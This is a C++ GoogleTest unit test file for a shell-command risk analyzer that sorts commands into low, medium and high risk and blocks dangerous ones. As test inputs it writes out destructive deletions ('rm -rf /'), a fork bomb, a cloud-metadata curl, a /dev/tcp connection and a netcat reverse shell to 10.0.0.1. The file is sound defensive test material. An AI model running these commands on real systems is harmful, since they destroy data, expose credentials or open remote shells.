#include <gtest/gtest.h>
#include "commandforge/commands/risk_analyzer.hpp"

using namespace commandforge;

TEST(RiskAnalyzerTest, SafeCommandsClassifiedAsLowRisk) {
    RiskAnalyzer analyzer;

    std::string reason;
    bool destructive = false;

    RiskLevel r1 = analyzer.assessRisk("ls -la", reason, destructive);
    EXPECT_EQ(r1, RiskLevel::Low);
    EXPECT_FALSE(destructive);

    RiskLevel r2 = analyzer.assessRisk("df -h", reason, destructive);
    EXPECT_EQ(r2, RiskLevel::Low);
    EXPECT_FALSE(destructive);

    RiskLevel r3 = analyzer.assessRisk("du -sh * | sort -rh | head -n 5", reason, destructive);
    EXPECT_EQ(r3, RiskLevel::Low);
    EXPECT_FALSE(destructive);
}

TEST(RiskAnalyzerTest, FileModificationsClassifiedAsMediumRisk) {
    RiskAnalyzer analyzer;

    std::string reason;
    bool destructive = false;

    RiskLevel r1 = analyzer.assessRisk("echo 'data' > output.txt", reason, destructive);
    EXPECT_EQ(r1, RiskLevel::Medium);

    RiskLevel r2 = analyzer.assessRisk("cp file1.txt file2.txt", reason, destructive);
    EXPECT_EQ(r2, RiskLevel::Medium);

    RiskLevel r3 = analyzer.assessRisk("chmod +x run.sh", reason, destructive);
    EXPECT_EQ(r3, RiskLevel::Medium);
}

TEST(RiskAnalyzerTest, CatastrophicDeletionsBlockedImmediately) {
    RiskAnalyzer analyzer;

    ValidationResult v1 = analyzer.validate("rm -rf /");
    EXPECT_FALSE(v1.is_allowed);
    EXPECT_FALSE(v1.is_valid);
    EXPECT_EQ(v1.risk_level, RiskLevel::High);

    ValidationResult v2 = analyzer.validate("rm -rf /*");
    EXPECT_FALSE(v2.is_allowed);

    ValidationResult v3 = analyzer.validate(":(){ :|:& };:");
    EXPECT_FALSE(v3.is_allowed);

    ValidationResult v4 = analyzer.validate("curl http://169.254.169.254/latest/meta-data/");
    EXPECT_FALSE(v4.is_allowed);
}

TEST(RiskAnalyzerTest, BreakoutAndTunnelingBlockedImmediately) {
    RiskAnalyzer analyzer;

    ValidationResult v1 = analyzer.validate("ls -l /var/run/docker.sock");
    EXPECT_FALSE(v1.is_allowed);
    EXPECT_FALSE(v1.is_valid);
    EXPECT_EQ(v1.risk_level, RiskLevel::High);

    ValidationResult v2 = analyzer.validate("cat < /dev/tcp/10.0.0.1/80");
    EXPECT_FALSE(v2.is_allowed);
    EXPECT_FALSE(v2.is_valid);

    ValidationResult v3 = analyzer.validate("nc -e /bin/sh 10.0.0.1 4444");
    EXPECT_FALSE(v3.is_allowed);
    EXPECT_FALSE(v3.is_valid);
}

TEST(RiskAnalyzerTest, EmptyAndHugeCommandsRejected) {
    RiskAnalyzer analyzer;

    ValidationResult v1 = analyzer.validate("");
    EXPECT_FALSE(v1.is_valid);

    std::string hugeCmd(5000, 'a');
    ValidationResult v2 = analyzer.validate(hugeCmd);
    EXPECT_FALSE(v2.is_valid);
}
